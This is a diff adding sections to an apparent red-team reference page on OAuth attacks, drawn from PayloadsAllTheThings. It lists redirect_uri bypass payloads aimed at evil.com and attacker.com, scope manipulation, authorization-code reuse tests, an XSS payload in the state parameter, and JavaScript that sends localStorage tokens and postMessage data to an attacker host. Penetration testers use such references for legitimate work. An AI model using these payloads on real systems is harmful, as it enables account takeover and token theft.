@@ -142,6 +142,106 @@ sessionStorage.getItem('oauth_token')
 # Best practice (defensively): tokens in HttpOnly cookies
 # Red team: target apps storing OAuth tokens in localStorage</code></pre>
 
+  <h2>OAuth Attack Techniques</h2>
+  <p>Additional attack techniques from PayloadsAllTheThings OAuth Misconfiguration reference.</p>
+
+  <h3>Stealing Token via Referer / HTML Injection</h3>
+  <pre><code># HTML injection without XSS — if img tag is injectable and OAuth is in use:
+# 1. Find an HTML injection point on the app (e.g. profile name rendered as HTML)
+# 2. Inject: &lt;img src="https://attacker.com/steal"&gt;
+# 3. Trick the victim to visit the page AFTER logging in via OAuth
+# 4. The OAuth token/code may appear in the Referer header of the img request
+# → Check attacker server logs for Authorization code in Referer
+
+# Best targets for Referer leakage:
+# - Any page where the OAuth callback code appears in the URL
+# - Pages that embed third-party images/scripts after the OAuth redirect</code></pre>
+
+  <h3>Scope Manipulation</h3>
+  <pre><code># Change scope to an invalid value to bypass redirect_uri filter:
+https://target.com/admin/oauth/authorize?
+  client_id=CLIENT_ID&amp;
+  scope=INVALID_SCOPE&amp;
+  redirect_uri=https://evil.com
+
+# Expand scope to gain additional permissions:
+# Original: scope=read
+# Modified: scope=read+write+admin
+
+# Downgrade scope then upgrade:
+# 1. Authorize with minimal scope (passes review)
+# 2. Replay token exchange with expanded scope parameter</code></pre>
+
+  <h3>Authorization Code Reuse</h3>
+  <pre><code># RFC violation — authorization codes must only be used once.
+# If server doesn't invalidate after first use:
+# 1. Obtain authorization code via normal OAuth flow
+# 2. Exchange for token (normal)
+# 3. Replay the code exchange — if a second token is issued: vulnerable
+# 4. All tokens issued from that code should be revoked per spec
+
+# Test:
+# Intercept the code in Burp
+# Exchange once (normal)
+# Repeat the POST /token request with same code
+# If 200 with token: authorization code reuse enabled</code></pre>
+
+  <h2>OAuth Redirect URI Bypass</h2>
+  <p>redirect_uri validation bypass techniques from PayloadsAllTheThings.</p>
+
+  <pre><code># Redirect to attacker-controlled domain:
+redirect_uri=https://localhost.evil.com
+redirect_uri=https://attacker.com
+
+# Redirect via open redirect on the target app:
+redirect_uri=https://app.com/redirect?url=https://attacker.com
+redirect_uri=https://app.com/logout?next=https://attacker.com
+
+# Redirect via whitelisted open redirect (accepted domain has open redirect):
+redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
+redirect_uri=https://apps.facebook.com/attacker/
+
+# Scope trick — change scope to bypass redirect_uri filter:
+https://target.com/oauth/authorize?client_id=X&amp;scope=INVALID&amp;redirect_uri=https://evil.com
+
+# Path traversal in redirect_uri:
+redirect_uri=https://app.com/callback/../../evil
+redirect_uri=https://app.com/callback%2F%2E%2E%2Fevil
+
+# Subdomain takeover chain:
+# 1. Find subdomain pointing to unclaimed hosting (app.attacker-controlled.target.com)
+# 2. Use as redirect_uri: redirect_uri=https://unclaimed.target.com/callback
+
+# XSS via redirect_uri state parameter:
+https://target.com/oauth/authorize?client_id=X&amp;redirect_uri=data%3Atext%2Fhtml%2Ca&amp;state=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
+
+  <h2>OAuth Token Theft</h2>
+  <p>Token exfiltration scenarios from PayloadsAllTheThings.</p>
+
+  <pre><code># Token in URL fragment (implicit flow):
+# fragment (#access_token=...) is not sent to servers in Referer
+# BUT: can be read by JavaScript on same page
+# If page embeds attacker JS or has XSS: steal fragment directly
+location.hash.substring(1)   # gets everything after #
+
+# Implicit flow token leakage via postMessage:
+# If the app uses postMessage to pass tokens to child windows:
+window.addEventListener('message', function(e) {
+  fetch('https://attacker.com/steal?t=' + JSON.stringify(e.data));
+});
+
+# localStorage token theft via XSS:
+fetch('https://attacker.com/steal?t=' + localStorage.getItem('access_token'))
+
+# Intercept token via Referer — chain with open redirect:
+# OAuth redirect → open redirect on app → attacker page
+# attacker page receives the code in the Referer header
+# Works when: app has open redirect + redirect_uri accepts path prefix
+
+# Force re-authorization to capture fresh code:
+# If prompt=none doesn't apply, victim may re-auth without noticing
+https://provider.com/oauth/authorize?client_id=X&amp;redirect_uri=attacker&amp;prompt=none</code></pre>
+
   <h2>Tools &amp; Resources</h2>
   <ul>
     <li>PortSwigger OAuth labs — <code>portswigger.net/web-security/oauth</code></li>
